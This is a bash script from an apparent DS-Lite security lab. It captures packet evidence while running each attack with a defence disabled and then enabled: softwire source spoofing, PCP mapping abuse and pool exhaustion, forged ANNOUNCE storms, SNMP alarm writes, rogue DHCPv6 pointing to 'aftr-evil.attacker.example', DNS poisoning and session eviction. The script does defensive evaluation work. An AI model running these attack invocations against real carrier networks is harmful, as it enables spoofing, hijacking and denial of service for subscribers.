#!/bin/bash
# capture_defenses.sh — capture per-family OFF/ON evidence for reference_captures.
# For each defence it runs the ACTUAL attack with the defence OFF (succeeds) and
# ON (blocked), capturing packets/logs at the relevant point. ALL artifacts are
# written INSIDE the container under the bind-mounted /testbed/pcaps/defcap/ so
# they appear on the host (root-owned, world-readable) — no host-side redirects,
# which avoids cross-ownership permission errors.
# Run from the host:  bash testbed/defenses/capture_defenses.sh
set -u
C="${CONTAINER_NAME:-ds-lite-lab}"
HERE="$(cd "$(dirname "$0")" && pwd)"
AP="$HERE/article_defenses.sh"
T=/testbed/attack_tools
CP=2001:db8:cafe; AFTR=$CP::10; VB4=$CP::b41; B42=$CP::b42; ATK6=$CP::13a
GW1=10.0.1.1; SRV=198.51.100.2; SHARED=192.0.2.1
dx(){ docker exec "$C" "$@"; }
nse(){ docker exec "$C" ip netns exec "$@"; }
dxsh(){ docker exec "$C" sh -c "$1"; }                 # run a shell line INSIDE the container
nsh(){ local ns="$1"; shift; docker exec "$C" ip netns exec "$ns" sh -c "$1"; }
OUT=/testbed/pcaps/defcap
dx rm -rf "$OUT" 2>/dev/null; dx mkdir -p "$OUT"
mk(){ dx mkdir -p "$OUT/$1"; }
cap(){ nse "$1" sh -c "tcpdump -U -ni '$2' -w '$3' '$4' >/dev/null 2>&1 &"; }
stopcap(){ dxsh "pkill -INT -f 'tcpdump.*$OUT' 2>/dev/null; sleep 1"; }

prov_attacker(){ nse attacker ip link show eth-isp >/dev/null 2>&1 || dxsh '
  ip netns add attacker 2>/dev/null
  ip link add eth-isp-atk type veth peer name atk-br 2>/dev/null
  ip link set eth-isp-atk netns attacker 2>/dev/null
  ip netns exec attacker ip link set eth-isp-atk name eth-isp 2>/dev/null
  ip link set atk-br master br-isp 2>/dev/null; ip link set atk-br up 2>/dev/null
  ip netns exec attacker ip link set lo up 2>/dev/null
  ip netns exec attacker ip link set eth-isp up 2>/dev/null
  ip netns exec attacker ip -6 addr add '"$ATK6"'/64 dev eth-isp 2>/dev/null'; }
hub_bridge(){ dx ip link set br-isp type bridge ageing_time 0 2>/dev/null
  dxsh 'for p in b41-br b42-br aftr-br atk-br dns-br dhcp6s-br; do bridge link set dev $p flood on mcast_flood on 2>/dev/null; done'; }
restart_pcp(){ nse aftr pkill -9 -f pcp_server.py 2>/dev/null
  nse b4-1 pkill -9 -f pcp_proxy.py 2>/dev/null; nse b4-2 pkill -9 -f pcp_proxy.py 2>/dev/null; sleep 0.6
  dx ip netns exec aftr env PCP_POOL_SIZE="${2:-1024}" $1 python3 /testbed/aftr/pcp_server.py >/dev/null 2>&1 &
  dx ip netns exec b4-1 env $1 python3 /testbed/b4/pcp_proxy.py --lan-ip 10.0.1.1 --b4-ip6 $VB4 --aftr-ip6 $AFTR --passthrough-third-party >/dev/null 2>&1 &
  dx ip netns exec b4-2 env $1 python3 /testbed/b4/pcp_proxy.py --lan-ip 10.0.2.1 --b4-ip6 $B42 --aftr-ip6 $AFTR --passthrough-third-party >/dev/null 2>&1 &
  sleep 2; }
prov_attacker; hub_bridge

# ── SAVI (T3/T5 softwire outer-source spoof) ────────────────────────────────
echo "SAVI"; mk SAVI
savi_run(){ cap aftr eth-isp "$OUT/SAVI/$1.pcap" "ip6 src $VB4 and ip6 dst $AFTR and ip6 proto 4"; sleep 0.6
  nse attacker sh -c "timeout 6 python3 $T/tunnel/tunnel_spoof.py spoof --interface eth-isp --src-ip6 $ATK6 --victim-b4-ip6 $VB4 --aftr-ip6 $AFTR --inner-src-ip4 10.0.1.77 --inner-dst-ip4 $SRV --proto udp --focused --dst-port 9999 --count 10 --batch 1 --interval 0.2" >/dev/null 2>&1
  sleep 1; stopcap; }
bash "$AP" SAVI off >/dev/null 2>&1; savi_run OFF
bash "$AP" SAVI on  >/dev/null 2>&1; savi_run ON
bash "$AP" SAVI off >/dev/null 2>&1

# ── ESP_AEAD (T4 softwire interception) ─────────────────────────────────────
echo "ESP_AEAD"; mk ESP_AEAD
esp_run(){ cap b4-1 eth-isp "$OUT/ESP_AEAD/$1.pcap" "ip6 proto 4 or esp"; sleep 0.6
  nse client1 sh -c "for i in 1 2 3 4 5; do curl -s -o /dev/null --max-time 3 http://$SRV/; done" >/dev/null 2>&1; sleep 1; stopcap; }
bash "$AP" ESP_AEAD off >/dev/null 2>&1; esp_run OFF
bash "$AP" ESP_AEAD on  >/dev/null 2>&1; esp_run ON
bash "$AP" ESP_AEAD off >/dev/null 2>&1

# ── PCP_OWNERSHIP (T8 THIRD_PARTY cross-sub DNAT) ───────────────────────────
echo "PCP_OWNERSHIP"; mk PCP_OWNERSHIP
own_run(){ nse aftr nft flush chain ip nat pcp_dnat 2>/dev/null
  cap b4-1 eth-isp "$OUT/PCP_OWNERSHIP/$1.pcap" "udp port 5351"; sleep 0.6
  nse client1 sh -c "timeout 8 python3 $T/infra/pcp_attack.py thirdparty --proxy-ip $GW1 --target-internal 10.0.2.100" >/dev/null 2>&1
  sleep 1; stopcap
  nse aftr sh -c "nft list chain ip nat pcp_dnat 2>/dev/null | grep 10.0.2.100 || echo '(no cross-subscriber DNAT installed)' > /dev/null; nft list chain ip nat pcp_dnat 2>/dev/null | grep 10.0.2.100 > $OUT/PCP_OWNERSHIP/$1.dnat.txt || echo '(no cross-subscriber DNAT installed)' > $OUT/PCP_OWNERSHIP/$1.dnat.txt"; }
restart_pcp ""; own_run OFF
restart_pcp "T10_THIRD_PARTY_OWNERSHIP_CHECK=1"; own_run ON
restart_pcp ""

# ── PCP_QUOTA (T7 shared-pool exhaustion, cross-sub) ────────────────────────
echo "PCP_QUOTA"; mk PCP_QUOTA
quota_run(){ cap aftr eth-isp "$OUT/PCP_QUOTA/$1.pcap" "udp port 5351"; sleep 0.5
  nse client1 sh -c "timeout 12 python3 $T/infra/pcp_attack.py exhaust --proxy-ip 10.0.1.1 --proto 17 --count 120" >/dev/null 2>&1
  nse client2 sh -c "timeout 8 python3 $T/infra/pcp_attack.py map --proxy-ip 10.0.2.1 --proto 17 --internal-port 9090 > $OUT/PCP_QUOTA/$1.b4-2-map.txt 2>&1"
  sleep 1; stopcap; }
restart_pcp "" 60; quota_run OFF
restart_pcp "T_PCP_QUOTA=20" 60; quota_run ON
restart_pcp "" 1024

# ── PCP_AUTH (T9 forged ANNOUNCE epoch-reset storm) ─────────────────────────
echo "PCP_AUTH"; mk PCP_AUTH
auth_run(){ # $1 tag, $2 envstr
  nse aftr pkill -9 -f pcp_server.py 2>/dev/null; nse b4-1 pkill -9 -f pcp_proxy.py 2>/dev/null; nse b4-2 pkill -9 -f pcp_proxy.py 2>/dev/null; sleep 0.6
  dx ip netns exec aftr env PCP_POOL_SIZE=1024 $2 python3 /testbed/aftr/pcp_server.py >/dev/null 2>&1 &
  dx ip netns exec b4-1 sh -c "$2 python3 /testbed/b4/pcp_proxy.py --lan-ip 10.0.1.1 --b4-ip6 $VB4 --aftr-ip6 $AFTR --passthrough-third-party > /tmp/proxy9.log 2>&1" &
  dx ip netns exec b4-2 env $2 python3 /testbed/b4/pcp_proxy.py --lan-ip 10.0.2.1 --b4-ip6 $B42 --aftr-ip6 $AFTR --passthrough-third-party >/dev/null 2>&1 &
  sleep 2
  cap b4-1 eth-isp "$OUT/PCP_AUTH/$1.pcap" "udp port 5351 or udp port 5350"; sleep 0.5
  nse client1 sh -c "timeout 8 python3 $T/infra/pcp_attack.py exhaust --proxy-ip $GW1 --count 30" >/dev/null 2>&1
  sleep 0.5; nse attacker sh -c "timeout 6 python3 $T/infra/pcp_attack.py announce --interface eth-isp --aftr-ip6 $AFTR --count 8" >/dev/null 2>&1; sleep 3
  stopcap
  dxsh "echo -n 'renewal storms sent: ' > $OUT/PCP_AUTH/$1.storms.txt; grep -c 'renewal storm sent' /tmp/proxy9.log 2>/dev/null >> $OUT/PCP_AUTH/$1.storms.txt || true"; }
auth_run OFF ""
auth_run ON  "T_PCP_AUTH=1"
restart_pcp ""

# ── NAT_LOG (T2 shared-IP attribution) ──────────────────────────────────────
echo "NAT_LOG"; mk NAT_LOG
LOG=/var/log/aftr-bindings.log
# NOTE: truncate (: > LOG), do NOT unlink — the AFTR logger holds the file open,
# so rm sends new records to a dangling inode and the count reads 0.
nat_run(){ dxsh ": > $LOG 2>/dev/null || true"
  nse client1 sh -c "timeout 8 python3 $T/dns/reputation_poisoning.py --mode scan --target $SRV --count 200" >/dev/null 2>&1; sleep 1.5
  dxsh "if [ -s $LOG ]; then cp $LOG $OUT/NAT_LOG/$1.attribution.log; wc -l < $LOG | tr -dc 0-9 > $OUT/NAT_LOG/$1.count.txt; else echo '(no attribution log produced)' > $OUT/NAT_LOG/$1.attribution.log; printf 0 > "$OUT/NAT_LOG/$1.count.txt"; fi"; }
bash "$AP" NAT_LOG off >/dev/null 2>&1; nat_run OFF
bash "$AP" NAT_LOG on  >/dev/null 2>&1; sleep 0.5; nat_run ON
bash "$AP" NAT_LOG off >/dev/null 2>&1; dxsh ": > $LOG 2>/dev/null || true"

# ── SNMP_USM (T14 alarm write) ──────────────────────────────────────────────
echo "SNMP_USM"; mk SNMP_USM
OIDP=1.3.6.1.2.1.240.1.3.1.8
snmp_run(){ # $1 tag, $2 read-mode (v2c|usm)
  cap aftr eth-mgmt "$OUT/SNMP_USM/$1.pcap" "udp port 161"; sleep 0.5
  nse mgmt sh -c "timeout 8 python3 $T/infra/snmp_attack.py set --target 10.99.0.1 --oid alarmPortNumber --value 2147483647" >/dev/null 2>&1
  sleep 0.5; stopcap
  if [ "$2" = usm ]; then
     nse aftr sh -c "python3 /testbed/defenses/snmpv3_client.py --host 10.99.0.1 --oid $OIDP > $OUT/SNMP_USM/$1.readback.txt 2>&1"
  else
     nse mgmt sh -c "snmpget -v2c -c public -t1 10.99.0.1 $OIDP > $OUT/SNMP_USM/$1.readback.txt 2>&1"
  fi; }
bash "$AP" SNMP_USM off >/dev/null 2>&1; sleep 0.5
nse mgmt snmpset -v2c -c public -t1 10.99.0.1 $OIDP i 1000 >/dev/null 2>&1
snmp_run OFF v2c
bash "$AP" SNMP_USM on >/dev/null 2>&1; sleep 0.5; snmp_run ON usm
bash "$AP" SNMP_USM off >/dev/null 2>&1

# ── DHCPV6_AUTH (T12/T13 rogue DHCPv6 AFTR-Name) ────────────────────────────
echo "DHCPV6_AUTH"; mk DHCPV6_AUTH
dx test -f /testbed/defenses/keys/dhcpv6_ed25519.sec || dx python3 /testbed/defenses/dhcpv6auth.py keygen --out /testbed/defenses/keys >/dev/null 2>&1
dhcp_run(){ # $1 tag, $2 mode (insecure|secure)
  dx pkill -9 -f 'dhcpd -6' 2>/dev/null
  nse b4-1 pkill -9 -f 'dhclient.*b4-1' 2>/dev/null; dx pkill -9 -f 'dhclient6-b4-1' 2>/dev/null
  cap attacker eth-isp "$OUT/DHCPV6_AUTH/$1.pcap" "udp port 546 or udp port 547"; sleep 0.4
  dx ip netns exec attacker python3 $T/infra/dhcpv6_hijack.py dhcp --interface eth-isp --attack-id T12 --attacker-ip6 $ATK6 --fake-aftr-fqdn aftr-evil.attacker.example. --fake-aftr-ip6 $ATK6 >/dev/null 2>&1 &
  sleep 1.5
  if [ "$2" = insecure ]; then
    nse b4-1 sh -c "python3 /testbed/defenses/dhcpv6auth.py client --iface eth-isp --key /testbed/defenses/keys --insecure --wait 4 2>&1 | grep -oE 'AFTR=[^ ]+' | head -1 > $OUT/DHCPV6_AUTH/$1.result.txt"
  else
    dx ip netns exec dhcpv6server python3 /testbed/defenses/dhcpv6auth.py server --iface eth-isp --key /testbed/defenses/keys --aftr aftr.dslite.example.com. --dns $CP::2 >/dev/null 2>&1 &
    sleep 0.5
    nse b4-1 sh -c "python3 /testbed/defenses/dhcpv6auth.py client --iface eth-isp --key /testbed/defenses/keys --wait 4 2>&1 | grep -oE 'AFTR=[^ ]+' | head -1 > $OUT/DHCPV6_AUTH/$1.result.txt"
  fi
  sleep 0.5; stopcap
  dx pkill -9 -f 'dhcpv6_hijack.py' 2>/dev/null; dx pkill -9 -f 'dhcpv6auth.py server' 2>/dev/null; }
dhcp_run OFF insecure
dhcp_run ON  secure

# ── DNS_0X20 (T11 off-path DNS poisoning) — via runner ──────────────────────
echo "DNS_0X20"; mk DNS_0X20
nse b4-1 pkill -9 -f dns_0x20_forwarder 2>/dev/null; nse dns-server pkill -9 -f dns_sink 2>/dev/null
nse dns-server ip -6 addr del $CP::5/64 dev eth-isp 2>/dev/null
bash "$AP" DNS_0X20 off >/dev/null 2>&1
dxsh "bash /testbed/scripts/run_attack_live.sh T11 2>&1 | grep -oE 'resolved to [0-9a-f:]+|resolved to <none>' | tail -1 > $OUT/DNS_0X20/OFF.result.txt"
bash "$AP" DNS_0X20 on >/dev/null 2>&1
dxsh "bash /testbed/scripts/run_attack_live.sh T11 2>&1 | grep -oE 'resolved to [0-9a-f:]+|resolved to <none>' | tail -1 > $OUT/DNS_0X20/ON.result.txt"
bash "$AP" DNS_0X20 off >/dev/null 2>&1

# ── FEISTEL_IPID (T6 inner IP-ID predictability) — algorithmic self-test ────
echo "FEISTEL_IPID"; mk FEISTEL_IPID
dxsh "python3 /testbed/defenses/ipid_feistel.py > $OUT/FEISTEL_IPID/selftest.txt 2>&1"

# ── TRABELSI (T1 session-table early eviction) — via runner ─────────────────
echo "TRABELSI"; mk TRABELSI
bash "$AP" TRABELSI off >/dev/null 2>&1
dxsh "bash /testbed/scripts/run_attack_live.sh T1 2>&1 | grep -oE 'client1=[0-9]+|conntrack=[0-9]+|[0-9]+ ESTABLISHED' | tr '\n' ' ' > $OUT/TRABELSI/OFF.result.txt"
bash "$AP" TRABELSI on >/dev/null 2>&1
dxsh "bash /testbed/scripts/run_attack_live.sh T1 2>&1 | grep -oE 'client1=[0-9]+|conntrack=[0-9]+|[0-9]+ ESTABLISHED' | tr '\n' ' ' > $OUT/TRABELSI/ON.result.txt"
bash "$AP" TRABELSI off >/dev/null 2>&1

echo "DONE — evidence in pcaps/defcap/"
